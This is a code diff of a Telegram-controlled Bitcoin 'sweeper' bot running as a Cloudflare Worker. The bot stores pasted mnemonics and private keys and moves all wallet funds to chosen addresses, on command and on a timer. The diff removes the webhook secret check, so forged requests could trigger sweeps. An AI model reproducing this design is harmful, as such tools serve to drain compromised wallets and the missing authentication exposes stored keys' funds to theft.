+            await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🗑️ Removed <b>${removed.label}</b>`);
+          }
+        } else if (callbackData.startsWith('send_')) {
+          const idx = parseInt(callbackData.split('_')[1]);
+          const recipients = await getRecipients(env, chatId);
+          if (idx >= 0 && idx < recipients.length) {
+            await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `📤 Sweeping to <code>${recipients[idx]}</code>...`);
+            await sweepAll(env, chatId, recipients[idx]);
+          }
+        }
       }
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, msg);
-    }
-    return;
-  }
-  if (text === '/sweep') {
-    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '🧹 Sweeping all wallets...');
-    await sweepAll(env, chatId, null);
-    return;
-  }
-  if (text === '/pause') {
-    await env.WALLETS.put('PAUSED', 'true');
-    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '⏸️ Sweeper paused.');
-    return;
-  }
-  if (text === '/resume') {
-    await env.WALLETS.put('PAUSED', 'false');
-    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '▶️ Sweeper resumed.');
-    return;
-  }
-  if (text === '/testapi') {
-    try {
-      const fee = await getRecommendedFee();
-      const testAddress = 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq';
-      const utxos = await getUtxos(testAddress);
-      const balance = utxos.reduce((sum, u) => sum + u.value, 0);
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId,
-        `🧪 <b>API Test Results</b>\n\n` +
-        `✅ Esplora reachable\n` +
-        `💰 Test address balance: ${(balance/1e8).toFixed(8)} BTC\n` +
-        `💸 Current fee: ${fee} sat/vbyte`);
-    } catch (e) {
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, `❌ API test failed:\n${e.message}`);
     }
     return;
   }
 
-  // ============================================================
-  // HANDLE TEXT INPUT (MNEMONICS, WIF, ADDRESSES)
-  // ============================================================
-  
-  // 12/24 Word Mnemonic
-  const words = text.trim().split(/\s+/);
-  if (words.length >= 12 && words.length <= 24) {
-    try {
-      if (!bip39.validateMnemonic(words.join(' '))) {
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid mnemonic.');
-        return;
-      }
-      const key = `wallets_${chatId}`;
-      const wallets = await env.WALLETS.get(key, 'json') || [];
-      const exists = wallets.some(w => w.mnemonic === words.join(' '));
-      if (exists) {
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '⚠️ Already imported.');
-        return;
-      }
-      wallets.push({ mnemonic: words.join(' '), label: `Wallet ${wallets.length+1}` });
-      await env.WALLETS.put(key, JSON.stringify(wallets));
-      const src = getAllSourceAddresses(words.join(' '))[0];
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId,
-        `✅ Wallet imported!\n\n🔹 Address: ${src.address}\n🔹 Label: Wallet ${wallets.length}`);
-    } catch (e) {
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, `❌ Error: ${e.message}`);
-    }
+  // ---- TEXT COMMANDS ----
+  const trimmed = text.trim();
+  if (trimmed === '/start' || trimmed.startsWith('/start') || trimmed === '/menu') {
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🤖 <b>Bitcoin Sweeper Bot</b>\n\nChoose an action:', mainMenuKeyboard());
     return;
   }
 
-  // WIF Private Key
-  if (/^[LK5][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(text.trim())) {
-    try {
-      const wif = text.trim();
-      const keyPair = bitcoin.ECPair.fromWIF(wif, NETWORK);
-      const address = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK }).address;
-      const key = `wallets_${chatId}`;
-      const wallets = await env.WALLETS.get(key, 'json') || [];
-      const exists = wallets.some(w => w.wif === wif);
-      if (exists) {
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '⚠️ Already imported.');
-        return;
-      }
-      wallets.push({ wif, label: `Wallet ${wallets.length+1}` });
-      await env.WALLETS.put(key, JSON.stringify(wallets));
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId,
-        `✅ Wallet imported!\n\n🔹 Address: ${address}\n🔹 Label: Wallet ${wallets.length}`);
-    } catch (e) {
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, `❌ Invalid WIF.`);
-    }
-    return;
-  }
-
-  // Bitcoin Address (Recipient)
-  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(text.trim()) || /^bc1[a-zA-HJ-NP-Z0-9]{39,59}$/.test(text.trim())) {
-    const address = text.trim();
-    const key = `recipients_${chatId}`;
-    let recipients = await env.WALLETS.get(key, 'json') || [];
-    if (!recipients.includes(address)) {
-      recipients.push(address);
-      await env.WALLETS.put(key, JSON.stringify(recipients));
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, `✅ Recipient added: ${address}`);
-    } else {
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, `⚠️ Already in list.`);
-    }
-    return;
-  }
-
-  // /balance Command
-  if (text.startsWith('/balance')) {
-    const parts = text.split(' ');
+  // /balance - check all wallets or specific address
+  if (trimmed === '/balance' || trimmed.startsWith('/balance')) {
+    const parts = trimmed.split(' ');
     if (parts.length > 1) {
       const addr = parts[1];
-      try {
-        const utxos = await getUtxos(addr);
-        const balance = utxos.reduce((sum, u) => sum + u.value, 0);
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId,
-          `📊 <b>Balance for ${addr}</b>\n\n` +
-          `💰 ${(balance/1e8).toFixed(8)} BTC\n` +
-          `📦 ${utxos.length} UTXOs`);
-      } catch (e) {
-        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, `❌ Error: ${e.message}`);
-      }
+      const bal = await getAddressBalance(addr);
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `📊 <b>${addr}</b>\n💰 ${(bal/1e8).toFixed(8)} BTC`);
     } else {
-      await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, 'Please provide an address: /balance <address>');
+      const wallets = await getWallets(env, chatId);
+      let msg = '📊 <b>Wallet Balances:</b>\n\n';
+      for (const w of wallets) {
+        const secret = w.mnemonic || w.wif || w.hex || w.xprv;
+        const addrs = getAllAddresses(secret, 5);
+        let total = 0;
+        for (const a of addrs) {
+          total += await getAddressBalance(a.address);
+        }
+        msg += `🔹 <b>${w.label}</b>: ${(total/1e8).toFixed(8)} BTC\n`;
+      }
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, wallets.length ? msg : '📭 No wallets imported.');
+    }
+    return;
+  }
+
+  // /add <address>
+  if (trimmed.startsWith('/add')) {
+    const parts = trimmed.split(' ');
+    if (parts.length < 2) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /add <bitcoin_address>');
+      return;
+    }
+    const addr = parts[1];
+    const type = detectKeyType(addr);
+    if (!type.startsWith('address')) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid Bitcoin address.');
+      return;
+    }
+    const recipients = await getRecipients(env, chatId);
+    if (recipients.includes(addr)) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⚠️ Already in recipient list.');
+    } else {
+      recipients.push(addr);
+      await saveRecipients(env, chatId, recipients);
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `✅ Recipient added: <code>${addr}</code>`);
+    }
+    return;
+  }
+
+  // /remove <address>
+  if (trimmed.startsWith('/remove')) {
+    const parts = trimmed.split(' ');
+    if (parts.length < 2) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /remove <bitcoin_address>');
+      return;
+    }
+    const addr = parts[1];
+    const recipients = await getRecipients(env, chatId);
+    const idx = recipients.indexOf(addr);
+    if (idx === -1) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Address not found in recipient list.');
+    } else {
+      recipients.splice(idx, 1);
+      await saveRecipients(env, chatId, recipients);
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🗑️ Recipient removed: <code>${addr}</code>`);
+    }
+    return;
+  }
+
+  // /recipients - list all
+  if (trimmed === '/recipients') {
+    const recipients = await getRecipients(env, chatId);
+    if (recipients.length === 0) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📭 No recipients. Add with /add <address>');
+    } else {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📤 <b>Recipients:</b>\n' + recipients.map(r => `<code>${r}</code>`).join('\n'));
+    }
+    return;
+  }
+
+  // /send <address> - sweep to specific address
+  if (trimmed.startsWith('/send')) {
+    const parts = trimmed.split(' ');
+    if (parts.length < 2) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /send <bitcoin_address>');
+      return;
+    }
+    const addr = parts[1];
+    const type = detectKeyType(addr);
+    if (!type.startsWith('address')) {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid Bitcoin address.');
+      return;
+    }
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `📤 Sweeping all wallets to <code>${addr}</code>...`);
+    await sweepAll(env, chatId, addr);
+    return;
+  }
+
+  // /sweep
+  if (trimmed === '/sweep') {
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🧹 Sweeping all wallets to MASTER_ADDRESS...');
+    await sweepAll(env, chatId);
+    return;
+  }
+
+  // /pause, /resume, /import, /list
+  if (trimmed === '/pause') { await env.WALLETS.put('PAUSED', 'true'); await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⏸️ Paused.'); return; }
+  if (trimmed === '/resume') { await env.WALLETS.put('PAUSED', 'false'); await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '▶️ Resumed.'); return; }
+  if (trimmed === '/list') {
+    const wallets = await getWallets(env, chatId);
+    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, wallets.length ? wallets.map(w => `🔹 ${w.label}`).join('\n') : '📭 No wallets.');
+    return;
+  }
+
+  // ---- KEY / ADDRESS INPUT ----
+  const keyType = detectKeyType(trimmed);
+  if (keyType === 'mnemonic' || keyType === 'wif' || keyType === 'hex' ||
+      keyType === 'xprv' || keyType === 'yprv' || keyType === 'zprv' || keyType === 'tprv') {
+    await importWallet(env, chatId, trimmed);
+    return;
+  }
+
+  if (keyType.startsWith('address')) {
+    const recipients = await getRecipients(env, chatId);
+    if (!recipients.includes(trimmed)) {
+      recipients.push(trimmed);
+      await saveRecipients(env, chatId, recipients);
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `✅ Recipient added: <code>${trimmed}</code>`);
+    } else {
+      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⚠️ Already in recipient list.');
     }
     return;
   }
 
   // Fallback
-  const keyboard = {
-    inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'menu' }]]
-  };
-  await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, 'I didn\'t understand that. Use the menu:', keyboard);
+  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❓ I didn\'t understand. Use /start for the menu.', mainMenuKeyboard());
 }
 
 // ============================================================
@@ -557,88 +635,35 @@ async function handleTelegramUpdate(update, env) {
 // ============================================================
 export default {
   async scheduled(event, env, ctx) {
-    await sweepAll(env, env.TELEGRAM_CHAT_ID, null);
+    ctx.waitUntil(sweepAll(env, env.TELEGRAM_CHAT_ID));
   },
-
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
     const { pathname } = url;
 
-    // Telegram webhook must be checked BEFORE authorization
     if (request.method === 'POST' && pathname === '/telegram-webhook') {
-      const secret = env.TELEGRAM_WEBHOOK_SECRET;
-      const received = request.headers.get('X-Telegram-Webhook-Secret');
-      if (secret && received && received !== secret) {
-        return new Response('Unauthorized', { status: 401 });
-      }
       const update = await request.json();
       ctx.waitUntil(handleTelegramUpdate(update, env));
       return new Response('OK');
     }
 
-    if (!isAuthorized(request, env)) {
+    if (request.headers.get('Authorization') !== `Bearer ${env.ADMIN_TOKEN}`) {
       return new Response('Unauthorized', { status: 401 });
-    }
-
-    if (request.method === 'POST' && pathname === '/add-wallet') {
-      const address = url.searchParams.get('address');
-      if (!address || (!/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(address) && !/^bc1[a-zA-HJ-NP-Z0-9]{39,59}$/.test(address))) {
-        return new Response('Invalid Bitcoin address', { status: 400 });
-      }
-      const recipients = (await env.WALLETS.get('recipients', 'json')) || [];
-      if (!recipients.includes(address)) {
-        recipients.push(address);
-        await env.WALLETS.put('recipients', JSON.stringify(recipients));
-        await sendTelegramMessage(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID, `➕ Wallet added: ${address}`);
-        return new Response(`Added ${address}`);
-      }
-      return new Response('Address already exists', { status: 409 });
-    }
-
-    if (request.method === 'GET' && pathname === '/list-wallets') {
-      const recipients = (await env.WALLETS.get('recipients', 'json')) || [];
-      return new Response(JSON.stringify(recipients), {
-        headers: { 'Content-Type': 'application/json' }
-      });
     }
 
     if (request.method === 'POST' && pathname === '/sweep') {
       const chatId = url.searchParams.get('chatId') || env.TELEGRAM_CHAT_ID;
-      ctx.waitUntil(sweepAll(env, chatId, null));
+      const to = url.searchParams.get('to') || null;
+      ctx.waitUntil(sweepAll(env, chatId, to));
       return new Response('Sweep triggered');
     }
-
     if (request.method === 'POST' && pathname === '/pause') {
       await env.WALLETS.put('PAUSED', 'true');
-      await sendTelegramMessage(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID, '⏸️ Sweeper paused');
       return new Response('Paused');
     }
-
     if (request.method === 'POST' && pathname === '/resume') {
       await env.WALLETS.put('PAUSED', 'false');
-      await sendTelegramMessage(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID, '▶️ Sweeper resumed');
       return new Response('Resumed');
-    }
-
-    if (request.method === 'GET' && pathname === '/status') {
-      const paused = (await env.WALLETS.get('PAUSED')) === 'true';
-      const currentFee = await getRecommendedFee();
-      const defaultChatId = env.TELEGRAM_CHAT_ID;
-      const key = `wallets_${defaultChatId}`;
-      const wallets = await env.WALLETS.get(key, 'json') || [];
-      let balances = {};
-      for (const w of wallets) {
-        const mnemonic = w.mnemonic || w.wif;
-        const sources = getAllSourceAddresses(mnemonic);
-        for (const src of sources) {
-          const utxos = await getUtxos(src.address);
-          const balance = utxos ? utxos.reduce((sum, u) => sum + u.value, 0) : 0;
-          balances[src.address] = { balance, utxos: utxos ? utxos.length : 0 };
-        }
-      }
-      return new Response(JSON.stringify({ paused, currentFee, balances }), {
-        headers: { 'Content-Type': 'application/json' }
-      });
     }
 
     return new Response('Not found', { status: 404 });
